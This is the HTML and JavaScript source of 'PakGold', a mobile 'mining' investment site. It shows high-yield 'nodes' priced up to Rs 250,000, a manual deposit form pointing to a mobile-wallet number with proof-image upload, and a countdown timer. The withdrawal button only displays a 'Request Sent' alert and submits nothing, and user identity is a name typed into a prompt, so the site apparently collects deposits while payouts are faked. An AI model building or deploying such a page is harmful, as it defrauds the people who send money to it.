<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
    <title>PakGold | Professional Mining</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;600;700;800&display=swap');
        :root { --bg: #06090f; --card: #0d1117; --accent: #fbbf24; }
        body { font-family: 'Plus Jakarta Sans', sans-serif; background: var(--bg); color: #f0f6fc; padding-bottom: 90px; }
        .glass { background: rgba(13, 17, 23, 0.8); backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.05); border-radius: 24px; }
        .page { display: none; }
        .active-page { display: block !important; animation: fadeIn 0.4s ease; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
        .btn-gold { background: linear-gradient(135deg, #fbbf24, #d97706); color: #000; font-weight: 800; border-radius: 14px; }
        .nav-active { color: var(--accent) !important; opacity: 1 !important; }
        marquee { background: rgba(251, 191, 36, 0.1); color: var(--accent); font-size: 10px; font-weight: 800; padding: 6px 0; }
    </style>
</head>
<body>

    <marquee>WELCOME TO PAKGOLD - HIGH YIELD NODES ACTIVE - MINIMUM DEPOSIT RS 200</marquee>

    <header class="p-6 flex justify-between items-center sticky top-0 bg-[#06090f]/90 z-[5000]">
        <div>
            <h1 class="text-xl font-black text-yellow-500 italic uppercase">PAK<span class="text-white">GOLD</span></h1>
            <p id="u-name" class="text-[8px] font-bold opacity-40 uppercase tracking-widest">User</p>
        </div>
        <div class="text-right">
            <p class="text-[8px] opacity-40 uppercase font-black">Balance</p>
            <h2 id="u-bal" class="text-xl font-black text-white">₨ 0.00</h2>
        </div>
    </header>

    <main class="p-4 space-y-6">
        <div id="p-home" class="page active-page space-y-6">
            <div class="glass p-6 border-l-4 border-yellow-500 flex justify-between items-center">
                <div>
                    <p class="text-[9px] font-black opacity-50 uppercase">Next Cycle</p>
                    <h3 id="timer" class="text-2xl font-black text-yellow-500">23:59:59</h3>
                </div>
                <div class="w-10 h-10 rounded-full bg-yellow-500/10 flex items-center justify-center animate-pulse">⚡</div>
            </div>
            
            <div class="glass p-4 flex gap-2">
                <input type="text" id="promo-input" placeholder="PROMO CODE" class="bg-[#161b22] border border-white/10 rounded-xl p-3 w-full text-center font-bold text-[10px] text-white outline-none">
                <button onclick="applyPromo()" class="btn-gold px-6 text-[10px] uppercase">Apply</button>
            </div>

            <div class="grid grid-cols-2 gap-3">
                <button onclick="showPage('deposit')" class="glass p-4 text-center font-bold text-[10px] uppercase border-b-2 border-green-500">Deposit</button>
                <button onclick="showPage('withdraw')" class="glass p-4 text-center font-bold text-[10px] uppercase border-b-2 border-red-500">Withdraw</button>
            </div>
        </div>

        <div id="p-nodes" class="page space-y-4">
            <h3 class="text-[10px] font-black uppercase text-yellow-500 tracking-widest">Mining Infrastructure (20+5)</h3>
            <div id="nodes-grid" class="space-y-3"></div>
        </div>

        <div id="p-deposit" class="page space-y-4">
            <div class="glass p-6">
                <h3 class="text-xs font-black uppercase mb-4">Manual Deposit</h3>
                <div class="bg-white/5 p-4 rounded-xl mb-4 text-[11px] font-bold border-l-2 border-yellow-500">
                    <p>EasyPaisa/JazzCash: 03379827882</p>
                </div>
                <input type="number" id="dep-amt" placeholder="Amount" class="bg-[#161b22] p-4 rounded-xl w-full mb-3 text-white outline-none">
                <input type="text" id="dep-tid" placeholder="TID Number" class="bg-[#161b22] p-4 rounded-xl w-full mb-3 text-white outline-none">
                <p class="text-[8px] opacity-50 mb-1 ml-1 uppercase font-bold">Upload Proof Image:</p>
                <input type="file" id="dep-file" class="bg-[#161b22] p-2 rounded-xl w-full mb-4 text-[10px] text-white">
                <button onclick="submitDep()" class="w-full p-4 btn-gold uppercase text-[11px]">Submit Proof</button>
            </div>
        </div>

        <div id="p-withdraw" class="page space-y-4">
            <div class="glass p-6">
                <h3 class="text-xs font-black uppercase mb-4">Request Payout</h3>
                <input type="number" id="w-amt" placeholder="Amount" class="bg-[#161b22] p-4 rounded-xl w-full mb-3 text-white">
                <input type="text" id="w-acc" placeholder="Account Number" class="bg-[#161b22] p-4 rounded-xl w-full mb-3 text-white">
                <button onclick="alert('Withdrawal Request Sent!')" class="w-full p-4 btn-gold uppercase text-[11px]">Request Withdraw</button>
            </div>
        </div>

        <div id="p-history" class="page space-y-4">
            <div class="flex justify-between items-center">
                <h3 class="text-xs font-black uppercase opacity-50">Activity</h3>
                <button onclick="document.getElementById('h-list').innerHTML=''" class="text-[9px] font-black text-red-500 uppercase">Clear History</button>
            </div>
            <div id="h-list" class="space-y-3"></div>
        </div>

        <div id="p-menu" class="page space-y-3">
            <button class="w-full glass p-4 text-left text-[11px] font-bold uppercase">Account Details</button>
            <button class="w-full glass p-4 text-left text-[11px] font-bold uppercase">Company Policy</button>
            <button onclick="window.location.href='https://wa.me/923705519562'" class="w-full glass p-4 text-left text-[11px] font-bold uppercase text-yellow-500">Contact Admin (Help)</button>
            <button onclick="localStorage.clear(); location.reload();" class="w-full p-4 bg-red-500/10 text-red-500 rounded-2xl font-black uppercase text-[10px] mt-6">Logout</button>
        </div>
    </main>

    <nav class="fixed bottom-0 w-full h-20 glass rounded-t-[2.5rem] flex justify-around items-center px-4 z-[10000]">
        <button onclick="showPage('home')" id="n-home" class="nav-active opacity-40 flex flex-col items-center gap-1">🏠<span class="text-[7px] font-black uppercase">Home</span></button>
        <button onclick="showPage('nodes')" id="n-nodes" class="opacity-40 flex flex-col items-center gap-1">⚡<span class="text-[7px] font-black uppercase">Nodes</span></button>
        <button onclick="showPage('history')" id="n-history" class="opacity-40 flex flex-col items-center gap-1">📜<span class="text-[7px] font-black uppercase">Logs</span></button>
        <button onclick="showPage('menu')" id="n-menu" class="opacity-40 flex flex-col items-center gap-1">👤<span class="text-[7px] font-black uppercase">Menu</span></button>
    </nav>

    <script>
        const firebaseConfig = { apiKey: "AIzaSyDt3ChZHyDdtM4Ir1oXRZJUywcOiV30Wtg", authDomain: "investment-84f4e.firebaseapp.com", projectId: "investment-84f4e", storageBucket: "investment-84f4e.appspot.com", messagingSenderId: "975293889308", appId: "1:975293889308:web:6d034a99cc966c75ff58d9" };
        firebase.initializeApp(firebaseConfig);
        const db = firebase.firestore();
        let user = localStorage.getItem('pg_user');

        function renderNodes() {
            const grid = document.getElementById('nodes-grid'); grid.innerHTML = '';
            for(let i=1; i<=25; i++) {
                let isVIP = i > 20;
                let cost = isVIP ? (i-20)*50000 : 200 + (i*1000);
                grid.innerHTML += `<div class="glass p-5 flex justify-between items-center border-r-4 ${isVIP?'border-green-500':'border-yellow-500'}"><div><p class="text-[8px] font-black text-yellow-500 uppercase">${isVIP?'VIP':'S-NODE'} 0${i}</p><h4 class="text-md font-black italic">₨ ${cost.toLocaleString()}</h4></div><button class="px-5 py-2 btn-gold text-[9px] uppercase">Activate</button></div>`;
            }
        }

        async function submitDep() {
            const a = document.getElementById('dep-amt').value; const t = document.getElementById('dep-tid').value; const f = document.getElementById('dep-file').files[0];
            if(!a || !t || !f) return alert("Fill all details!");
            const r = new FileReader(); r.readAsDataURL(f);
            r.onload = async () => {
                await db.collection("requests").add({ user, amount: parseFloat(a), tid: t, proof: r.result, type: 'deposit', status: 'pending', time: Date.now() });
                alert("Deposit Sent!"); showPage('home');
            };
        }

        function checkUser() {
            if(user) {
                document.getElementById('u-name').innerText = "@" + user;
                db.collection("users").doc(user).onSnapshot(d => { document.getElementById('u-bal').innerText = "₨ " + (d.data()?.balance || 0).toLocaleString(); });
                renderNodes(); startTimer();
            } else {
                let n = prompt("Enter Name:"); if(n) { localStorage.setItem('pg_user', n.toLowerCase()); location.reload(); }
            }
        }

        function startTimer() {
            setInterval(() => {
                let d = new Date(); let h = 23 - d.getHours(); let m = 59 - d.getMinutes(); let s = 59 - d.getSeconds();
                document.getElementById('timer').innerText = `${h < 10 ? '0'+h : h}:${m < 10 ? '0'+m : m}:${s < 10 ? '0'+s : s}`;
            }, 1000);
        }

        function showPage(p) {
            document.querySelectorAll('.page').forEach(pg => pg.classList.remove('active-page'));
            document.getElementById('p-'+p).classList.add('active-page');
            document.querySelectorAll('nav button').forEach(b => { b.classList.add('opacity-40'); b.classList.remove('nav-active'); });
            document.getElementById('n-'+p)?.classList.add('nav-active');
            document.getElementById('n-'+p)?.classList.remove('opacity-40');
        }

        window.onload = checkUser;
    </script>
</body>
</html>
